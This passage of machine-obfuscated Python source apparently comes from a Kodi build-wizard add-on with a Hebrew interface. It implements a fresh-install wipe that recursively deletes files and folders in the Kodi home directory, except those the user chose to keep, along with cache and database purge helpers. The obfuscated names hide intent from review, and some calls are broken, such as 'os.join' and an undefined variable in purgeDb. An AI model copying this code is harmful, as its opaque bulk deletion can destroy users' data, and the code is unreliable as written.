				elif O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO -2 ]=='userdata'and O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO -1 ]=='addon_data'and 'skin.Premium.mod'in O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O000OOOOO0OOO00O0 ,OO0O0O00OO00OOOO0 ),xbmc .LOGNOTICE )#line:4942
				elif O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO -2 ]=='userdata'and O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO -1 ]=='addon_data'and 'skin.anonymous.nox'in O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O000OOOOO0OOO00O0 ,OO0O0O00OO00OOOO0 ),xbmc .LOGNOTICE )#line:4943
				elif O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO -2 ]=='userdata'and O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO -1 ]=='addon_data'and 'skin.phenomenal'in O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O000OOOOO0OOO00O0 ,OO0O0O00OO00OOOO0 ),xbmc .LOGNOTICE )#line:4944
				elif O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO -2 ]=='userdata'and O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO -1 ]=='addon_data'and 'plugin.video.metalliq'in O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO ]and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O000OOOOO0OOO00O0 ,OO0O0O00OO00OOOO0 ),xbmc .LOGNOTICE )#line:4945
				elif O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO -2 ]=='userdata'and O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO -1 ]=='addon_data'and 'skin.titan'in O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO ]and KEEPSKIN3 =='true':wiz .log ("Install titan: %s"%os .path .join (O000OOOOO0OOO00O0 ,OO0O0O00OO00OOOO0 ),xbmc .LOGNOTICE )#line:4947
				elif O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO -2 ]=='userdata'and O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO -1 ]=='addon_data'and 'pvr.iptvsimple'in O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO ]and KEEPPVR =='true':wiz .log ("Keep Pvr: %s"%os .path .join (O000OOOOO0OOO00O0 ,OO0O0O00OO00OOOO0 ),xbmc .LOGNOTICE )#line:4948
				elif OO0O0O00OO00OOOO0 =='sources.xml'and O0000O0OOOOO0O0OO [-1 ]=='userdata'and KEEPSOURCES =='true':wiz .log ("Keep Sources: %s"%os .path .join (O000OOOOO0OOO00O0 ,OO0O0O00OO00OOOO0 ),xbmc .LOGNOTICE )#line:4950
				elif OO0O0O00OO00OOOO0 =='quicknav.DATA.xml'and O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO -2 ]=='userdata'and O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO -1 ]=='addon_data'and 'script.skinshortcuts'in O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO ]and KEEPTVLIST =='true':wiz .log ("Keep Tv List: %s"%os .path .join (O000OOOOO0OOO00O0 ,OO0O0O00OO00OOOO0 ),xbmc .LOGNOTICE )#line:4953
				elif OO0O0O00OO00OOOO0 =='x1101.DATA.xml'and O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO -2 ]=='userdata'and O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO -1 ]=='addon_data'and 'script.skinshortcuts'in O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (O000OOOOO0OOO00O0 ,OO0O0O00OO00OOOO0 ),xbmc .LOGNOTICE )#line:4954
				elif OO0O0O00OO00OOOO0 =='b-srtym-b.DATA.xml'and O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO -2 ]=='userdata'and O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO -1 ]=='addon_data'and 'script.skinshortcuts'in O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (O000OOOOO0OOO00O0 ,OO0O0O00OO00OOOO0 ),xbmc .LOGNOTICE )#line:4955
				elif OO0O0O00OO00OOOO0 =='x1102.DATA.xml'and O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO -2 ]=='userdata'and O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO -1 ]=='addon_data'and 'script.skinshortcuts'in O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (O000OOOOO0OOO00O0 ,OO0O0O00OO00OOOO0 ),xbmc .LOGNOTICE )#line:4956
				elif OO0O0O00OO00OOOO0 =='b-sdrvt-b.DATA.xml'and O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO -2 ]=='userdata'and O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO -1 ]=='addon_data'and 'script.skinshortcuts'in O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (O000OOOOO0OOO00O0 ,OO0O0O00OO00OOOO0 ),xbmc .LOGNOTICE )#line:4957
				elif OO0O0O00OO00OOOO0 =='x1112.DATA.xml'and O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO -2 ]=='userdata'and O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO -1 ]=='addon_data'and 'script.skinshortcuts'in O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (O000OOOOO0OOO00O0 ,OO0O0O00OO00OOOO0 ),xbmc .LOGNOTICE )#line:4958
				elif OO0O0O00OO00OOOO0 =='b-tlvvyzyh-b.DATA.xml'and O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO -2 ]=='userdata'and O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO -1 ]=='addon_data'and 'script.skinshortcuts'in O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (O000OOOOO0OOO00O0 ,OO0O0O00OO00OOOO0 ),xbmc .LOGNOTICE )#line:4959
				elif OO0O0O00OO00OOOO0 =='x1111.DATA.xml'and O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO -2 ]=='userdata'and O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO -1 ]=='addon_data'and 'script.skinshortcuts'in O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (O000OOOOO0OOO00O0 ,OO0O0O00OO00OOOO0 ),xbmc .LOGNOTICE )#line:4960
				elif OO0O0O00OO00OOOO0 =='b-tvknyshrly-b.DATA.xml'and O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO -2 ]=='userdata'and O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO -1 ]=='addon_data'and 'script.skinshortcuts'in O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (O000OOOOO0OOO00O0 ,OO0O0O00OO00OOOO0 ),xbmc .LOGNOTICE )#line:4961
				elif OO0O0O00OO00OOOO0 =='x1110.DATA.xml'and O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO -2 ]=='userdata'and O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO -1 ]=='addon_data'and 'script.skinshortcuts'in O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (O000OOOOO0OOO00O0 ,OO0O0O00OO00OOOO0 ),xbmc .LOGNOTICE )#line:4962
				elif OO0O0O00OO00OOOO0 =='b-yldym-b.DATA.xml'and O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO -2 ]=='userdata'and O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO -1 ]=='addon_data'and 'script.skinshortcuts'in O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (O000OOOOO0OOO00O0 ,OO0O0O00OO00OOOO0 ),xbmc .LOGNOTICE )#line:4963
				elif OO0O0O00OO00OOOO0 =='x1114.DATA.xml'and O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO -2 ]=='userdata'and O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO -1 ]=='addon_data'and 'script.skinshortcuts'in O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (O000OOOOO0OOO00O0 ,OO0O0O00OO00OOOO0 ),xbmc .LOGNOTICE )#line:4964
				elif OO0O0O00OO00OOOO0 =='b-mvzyqh-b.DATA.xml'and O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO -2 ]=='userdata'and O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO -1 ]=='addon_data'and 'script.skinshortcuts'in O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (O000OOOOO0OOO00O0 ,OO0O0O00OO00OOOO0 ),xbmc .LOGNOTICE )#line:4965
				elif OO0O0O00OO00OOOO0 =='mainmenu.DATA.xml'and O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO -2 ]=='userdata'and O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO -1 ]=='addon_data'and 'script.skinshortcuts'in O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (O000OOOOO0OOO00O0 ,OO0O0O00OO00OOOO0 ),xbmc .LOGNOTICE )#line:4966
				elif OO0O0O00OO00OOOO0 =='skin.Premium.mod.properties'and O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO -2 ]=='userdata'and O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO -1 ]=='addon_data'and 'script.skinshortcuts'in O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (O000OOOOO0OOO00O0 ,OO0O0O00OO00OOOO0 ),xbmc .LOGNOTICE )#line:4967
				elif OO0O0O00OO00OOOO0 =='x1122.DATA.xml'and O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO -2 ]=='userdata'and O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO -1 ]=='addon_data'and 'script.skinshortcuts'in O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO ]and KEEPHUBSPORT =='true':wiz .log ("Keep Hub Sport: %s"%os .path .join (O000OOOOO0OOO00O0 ,OO0O0O00OO00OOOO0 ),xbmc .LOGNOTICE )#line:4969
				elif OO0O0O00OO00OOOO0 =='b-spvrt-b.DATA.xml'and O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO -2 ]=='userdata'and O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO -1 ]=='addon_data'and 'script.skinshortcuts'in O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO ]and KEEPHUBSPORT =='true':wiz .log ("Keep Hub Sport: %s"%os .path .join (O000OOOOO0OOO00O0 ,OO0O0O00OO00OOOO0 ),xbmc .LOGNOTICE )#line:4970
				elif OO0O0O00OO00OOOO0 =='favourites.xml'and O0000O0OOOOO0O0OO [-1 ]=='userdata'and KEEPFAVS =='true':wiz .log ("Keep Favourites: %s"%os .path .join (O000OOOOO0OOO00O0 ,OO0O0O00OO00OOOO0 ),xbmc .LOGNOTICE )#line:4975
				elif OO0O0O00OO00OOOO0 =='guisettings.xml'and O0000O0OOOOO0O0OO [-1 ]=='userdata'and KEEPSOUND =='true':wiz .log ("Keep Sound: %s"%os .path .join (O000OOOOO0OOO00O0 ,OO0O0O00OO00OOOO0 ),xbmc .LOGNOTICE )#line:4977
				elif OO0O0O00OO00OOOO0 =='profiles.xml'and O0000O0OOOOO0O0OO [-1 ]=='userdata'and KEEPPROFILES =='true':wiz .log ("Keep Profiles: %s"%os .path .join (O000OOOOO0OOO00O0 ,OO0O0O00OO00OOOO0 ),xbmc .LOGNOTICE )#line:4978
				elif OO0O0O00OO00OOOO0 =='advancedsettings.xml'and O0000O0OOOOO0O0OO [-1 ]=='userdata'and KEEPADVANCED =='true':wiz .log ("Keep Advanced Settings: %s"%os .path .join (O000OOOOO0OOO00O0 ,OO0O0O00OO00OOOO0 ),xbmc .LOGNOTICE )#line:4979
				elif O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO -2 ]=='userdata'and O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO -1 ]=='addon_data'and 'plugin.video.sdarot.tv'in O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O000OOOOO0OOO00O0 ,OO0O0O00OO00OOOO0 ),xbmc .LOGNOTICE )#line:4980
				elif O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO -2 ]=='userdata'and O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO -1 ]=='addon_data'and 'program.apollo'in O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O000OOOOO0OOO00O0 ,OO0O0O00OO00OOOO0 ),xbmc .LOGNOTICE )#line:4981
				elif O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO -2 ]=='userdata'and O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO -1 ]=='addon_data'and 'plugin.video.allmoviesin'in O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO ]and KEEPVICTORY =='true':wiz .log ("Keep Info: %s"%os .path .join (O000OOOOO0OOO00O0 ,OO0O0O00OO00OOOO0 ),xbmc .LOGNOTICE )#line:4982
				elif O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO -2 ]=='userdata'and O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO -1 ]=='addon_data'and 'plugin.video.telemedia'in O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO ]and KEEPTELEMEDIA =='true':wiz .log ("Keep Info: %s"%os .path .join (O000OOOOO0OOO00O0 ,OO0O0O00OO00OOOO0 ),xbmc .LOGNOTICE )#line:4983
				elif O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO -2 ]=='userdata'and O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO -1 ]=='addon_data'and 'plugin.video.elementum'in O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O000OOOOO0OOO00O0 ,OO0O0O00OO00OOOO0 ),xbmc .LOGNOTICE )#line:4986
				elif O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO -2 ]=='userdata'and O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO -1 ]=='addon_data'and 'plugin.audio.soundcloud'in O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O000OOOOO0OOO00O0 ,OO0O0O00OO00OOOO0 ),xbmc .LOGNOTICE )#line:4988
				elif O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO -2 ]=='userdata'and O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO -1 ]=='addon_data'and 'weather.yahoo'in O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO ]and KEEPWEATHER =='true':wiz .log ("Keep weather: %s"%os .path .join (O000OOOOO0OOO00O0 ,OO0O0O00OO00OOOO0 ),xbmc .LOGNOTICE )#line:4989
				elif O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO -2 ]=='userdata'and O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO -1 ]=='addon_data'and 'plugin.video.quasar'in O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O000OOOOO0OOO00O0 ,OO0O0O00OO00OOOO0 ),xbmc .LOGNOTICE )#line:4990
				elif O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO -2 ]=='userdata'and O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO -1 ]=='addon_data'and 'program.apollo'in O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O000OOOOO0OOO00O0 ,OO0O0O00OO00OOOO0 ),xbmc .LOGNOTICE )#line:4991
				elif O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO -2 ]=='userdata'and O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO -1 ]=='addon_data'and 'plugin.video.PastebinPlay'in O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O000OOOOO0OOO00O0 ,OO0O0O00OO00OOOO0 ),xbmc .LOGNOTICE )#line:4992
				elif O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO -2 ]=='userdata'and O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO -1 ]=='addon_data'and 'plugin.video.playlistLoader'in O0000O0OOOOO0O0OO [O00OO00O00O0O0OOO ]and KEEPPLAYLIST =='true':wiz .log ("Keep playlist: %s"%os .path .join (O000OOOOO0OOO00O0 ,OO0O0O00OO00OOOO0 ),xbmc .LOGNOTICE )#line:4993
				elif OO0O0O00OO00OOOO0 in LOGFILES :wiz .log ("Keep Log File: %s"%OO0O0O00OO00OOOO0 ,xbmc .LOGNOTICE )#line:4994
				elif OO0O0O00OO00OOOO0 .endswith ('.db'):#line:4995
					try :#line:4996
						if OO0O0O00OO00OOOO0 ==O000OO0O0O0OOOO0O and KODIV >=17 :wiz .log ("Ignoring %s on v%s"%(OO0O0O00OO00OOOO0 ,KODIV ),xbmc .LOGNOTICE )#line:4997
						else :os .remove (os .path .join (O000OOOOO0OOO00O0 ,OO0O0O00OO00OOOO0 ))#line:4998
					except Exception as O00O0O0O0O0OOO00O :#line:4999
						if not OO0O0O00OO00OOOO0 .startswith ('Textures13'):#line:5000
							wiz .log ('Failed to delete, Purging DB',xbmc .LOGNOTICE )#line:5001
							wiz .log ("-> %s"%(str (O00O0O0O0O0OOO00O )),xbmc .LOGNOTICE )#line:5002
							wiz .purgeDb (os .path .join (O000OOOOO0OOO00O0 ,OO0O0O00OO00OOOO0 ))#line:5003
				else :#line:5004
					DP .update (int (wiz .percentage (O0O0O0OOO000OO00O ,O00OO00OOO000OOOO )),'','[COLOR %s]File: [/COLOR][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0O0O00OO00OOOO0 ),'')#line:5005
					try :os .remove (os .path .join (O000OOOOO0OOO00O0 ,OO0O0O00OO00OOOO0 ))#line:5006
					except Exception as O00O0O0O0O0OOO00O :#line:5007
						wiz .log ("Error removing %s"%os .path .join (O000OOOOO0OOO00O0 ,OO0O0O00OO00OOOO0 ),xbmc .LOGNOTICE )#line:5008
						wiz .log ("-> / %s"%(str (O00O0O0O0O0OOO00O )),xbmc .LOGNOTICE )#line:5009
			if DP .iscanceled ():#line:5010
				DP .close ()#line:5011
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:5012
				return False #line:5013
		for O000OOOOO0OOO00O0 ,OOO0000000000O000 ,OO0OOOO00OO000O00 in os .walk (OO0OOOO0O0000O0O0 ,topdown =True ):#line:5014
			OOO0000000000O000 [:]=[OOOOO0O0000OO0000 for OOOOO0O0000OO0000 in OOO0000000000O000 if OOOOO0O0000OO0000 not in EXCLUDES ]#line:5015
			for OO0O0O00OO00OOOO0 in OOO0000000000O000 :#line:5016
			  DP .update (100 ,'','Cleaning Up Empty Folder: [COLOR %s]%s[/COLOR]'%(COLOR1 ,OO0O0O00OO00OOOO0 ),'')#line:5017
			  if OO0O0O00OO00OOOO0 not in ["Database","userdata","temp","addons","addon_data"]:#line:5018
			   if not (OO0O0O00OO00OOOO0 =='script.skinshortcuts'and KEEPSKIN =='true'):#line:5019
			    if not (OO0O0O00OO00OOOO0 =='skin.titan'and KEEPSKIN3 =='true'):#line:5021
			      if not (OO0O0O00OO00OOOO0 =='pvr.iptvsimple'and KEEPPVR =='true'):#line:5022
			       if not (OO0O0O00OO00OOOO0 =='plugin.video.metalliq'and KEEPMOVIELIST =='true'):#line:5023
			        if not (OO0O0O00OO00OOOO0 =='plugin.video.sdarot.tv'and KEEPINFO =='true'):#line:5024
			         if not (OO0O0O00OO00OOOO0 =='program.apollo'and KEEPINFO =='true'):#line:5025
			          if not (OO0O0O00OO00OOOO0 =='script.skinshortcuts'and KEEPHUBMOVIE =='true'):#line:5026
			           if not (OO0O0O00OO00OOOO0 =='weather.yahoo'and KEEPWEATHER =='true'):#line:5027
			            if not (OO0O0O00OO00OOOO0 =='plugin.video.playlistLoader'and KEEPPLAYLIST =='true'):#line:5028
			             if not (OO0O0O00OO00OOOO0 =='script.skinshortcuts'and KEEPHUBTVSHOW =='true'):#line:5029
			              if not (OO0O0O00OO00OOOO0 =='script.skinshortcuts'and KEEPHUBTV =='true'):#line:5030
			               if not (OO0O0O00OO00OOOO0 =='script.skinshortcuts'and KEEPHUBVOD =='true'):#line:5031
			                if not (OO0O0O00OO00OOOO0 =='script.skinshortcuts'and KEEPHUBKIDS =='true'):#line:5032
			                 if not (OO0O0O00OO00OOOO0 =='script.skinshortcuts'and KEEPHUBMUSIC =='true'):#line:5033
			                  if not (OO0O0O00OO00OOOO0 =='plugin.video.neptune'and KEEPINFO =='true'):#line:5034
			                   if not (OO0O0O00OO00OOOO0 =='plugin.video.youtube'and KEEPINFO =='true'):#line:5035
			                    if not (OO0O0O00OO00OOOO0 =='service.subtitles.subscenter'and KEEPINFO =='true'):#line:5036
			                     if not (OO0O0O00OO00OOOO0 =='script.skinshortcuts'and KEEPHUBMENU =='true'):#line:5037
			                      if not (OO0O0O00OO00OOOO0 =='plugin.video.allmoviesin'and KEEPVICTORY =='true'):#line:5038
			                       if not (OO0O0O00OO00OOOO0 =='plugin.video.telemedia'and KEEPTELEMEDIA =='true'):#line:5039
			                           if not (OO0O0O00OO00OOOO0 =='plugin.audio.soundcloud'and KEEPINFO =='true'):#line:5043
			                            if not (OO0O0O00OO00OOOO0 =='plugin.video.kodipopcorntime'and KEEPINFO =='true'):#line:5044
			                             if not (OO0O0O00OO00OOOO0 =='plugin.video.torrenter'and KEEPINFO =='true'):#line:5045
			                              if not (OO0O0O00OO00OOOO0 =='plugin.video.quasar'and KEEPINFO =='true'):#line:5046
			                               if not (OO0O0O00OO00OOOO0 =='script.skinshortcuts'and KEEPTVLIST =='true'):#line:5047
			                                  shutil .rmtree (os .path .join (O000OOOOO0OOO00O0 ,OO0O0O00OO00OOOO0 ),ignore_errors =True ,onerror =None )#line:5049
			if DP .iscanceled ():#line:5050
				DP .close ()#line:5051
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:5052
				return False #line:5053
		DP .close ()#line:5054
		wiz .clearS ('build')#line:5055
		if over ==True :#line:5056
			return True #line:5057
		elif install =='restore':#line:5058
			return True #line:5059
		elif install :#line:5060
			buildWizard (install ,'normal',over =True )#line:5061
		else :#line:5062
			if INSTALLMETHOD ==1 :O00O0O00O00OO0000 =1 #line:5063
			elif INSTALLMETHOD ==2 :O00O0O00O00OO0000 =0 #line:5064
			else :O00O0O00O00OO0000 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצגת נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR red]הצגת נתונים[/COLOR][/B]",nolabel ="[B][COLOR green]סגירה[/COLOR][/B]")#line:5065
			if O00O0O00O00OO0000 ==1 :wiz .reloadFix ('fresh')#line:5066
			else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:5067
	else :#line:5068
		if not install =='restore':#line:5069
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: מבוטלת![/COLOR]'%COLOR2 )#line:5070
			wiz .refresh ()#line:5071
def clearCache ():#line:5076
		wiz .clearCache ()#line:5077
def fixwizard ():#line:5081
		wiz .fixwizard ()#line:5082
def totalClean ():#line:5084
		wiz .clearCache ()#line:5086
		wiz .clearPackages ('total')#line:5087
		clearThumb ('total')#line:5088
		cleanfornewbuild ()#line:5089
def cleanfornewbuild ():#line:5090
		try :#line:5091
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.xml"))#line:5092
		except :#line:5093
			pass #line:5094
		try :#line:5095
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.json"))#line:5096
		except :#line:5097
			pass #line:5098
		try :#line:5099
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.TheFirstAvenger","localfile.txt"))#line:5100
		except :#line:5101
			pass #line:5102
def clearThumb (type =None ):#line:5103
	OO0000OO0OO0O00OO =wiz .latestDB ('Textures')#line:5104
	if not type ==None :OOOOO0000OO0O0O0O =1 #line:5105
	else :OOOOO0000OO0O0O0O =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to delete the %s and Thumbnails folder?'%(COLOR2 ,OO0000OO0OO0O00OO ),"They will repopulate on the next startup[/COLOR]",nolabel ='[B][COLOR red]Don\'t Delete[/COLOR][/B]',yeslabel ='[B][COLOR green]Delete Thumbs[/COLOR][/B]')#line:5106
	if OOOOO0000OO0O0O0O ==1 :#line:5107
		try :wiz .removeFile (os .join (DATABASE ,OO0000OO0OO0O00OO ))#line:5108
		except :wiz .log ('Failed to delete, Purging DB.');wiz .purgeDb (OO0000OO0OO0O00OO )#line:5109
		wiz .removeFolder (THUMBS )#line:5110
	else :wiz .log ('Clear thumbnames cancelled')#line:5112
	wiz .redoThumbs ()#line:5113
def purgeDb ():#line:5115
	O0O0O000O0OOOOO00 =[];O00O00OOO0OOOO0OO =[]#line:5116
	for O0OO000OO0OO0OOO0 ,OO0OOO0OOO000O000 ,O00O000O0O00O00OO in os .walk (HOME ):#line:5117
		for OOO0000O000OO0OOO in fnmatch .filter (O00O000O0O00O00OO ,'*.db'):#line:5118
			if OOO0000O000OO0OOO !='Thumbs.db':#line:5119
				O0O0000OOOO00000O =os .path .join (O0OO000OO0OO0OOO0 ,OOO0000O000OO0OOO )#line:5120
				O0O0O000O0OOOOO00 .append (O0O0000OOOO00000O )#line:5121
				O0O000OO000000OOO =O0O0000OOOO00000O .replace ('\\','/').split ('/')#line:5122
				O00O00OOO0OOOO0OO .append ('(%s) %s'%(O0O000OO000000OOO [len (O0O000OO000000OOO )-2 ],O0O000OO000000OOO [len (O0O000OO000000OOO )-1 ]))#line:5123
	if KODIV >=16 :#line:5124
		O0OOOO00OO0000OO0 =DIALOG .multiselect ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,O00O00OOO0OOOO0OO )#line:5125
		if O0OOOO00OO0000OO0 ==None :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5126
		elif len (O0OOOO00OO0000OO0 )==0 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5127
		else :#line:5128
			for O0O0O0OO00OO0OOOO in O0OOOO00OO0000OO0 :wiz .purgeDb (O0O0O000O0OOOOO00 [O0O0O0OO00OO0OOOO ])#line:5129
	else :#line:5130
		O0OOOO00OO0000OO0 =DIALOG .select ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,O00O00OOO0OOOO0OO )#line:5131
		if O0OOOO00OO0000OO0 ==-1 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5132
		else :wiz .purgeDb (O0O0O000O0OOOOO00 [O0O0O0OO00OO0OOOO ])#line:5133
def fastupdatefirstbuild (OO0000O00000OO0O0 ):#line:5139
	wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]בודק אם קיים עדכון בשבילך[/COLOR]'%COLOR2 )#line:5141
	if ENABLE =='Yes':#line:5142
		if not NOTIFY =='true':#line:5143
			O0O000000OOOOOOOO =wiz .workingURL (NOTIFICATION )#line:5144
			if O0O000000OOOOOOOO ==True :#line:5145
				O00O0O0OOO000O0OO ,OOO0OOOO0OOOOOOO0 =wiz .splitNotify (NOTIFICATION )#line:5146
				if not O00O0O0OOO000O0OO ==False :#line:5148
					try :#line:5149
						O00O0O0OOO000O0OO =int (O00O0O0OOO000O0OO );OO0000O00000OO0O0 =int (OO0000O00000OO0O0 )#line:5150
						checkidupdate ()#line:5151
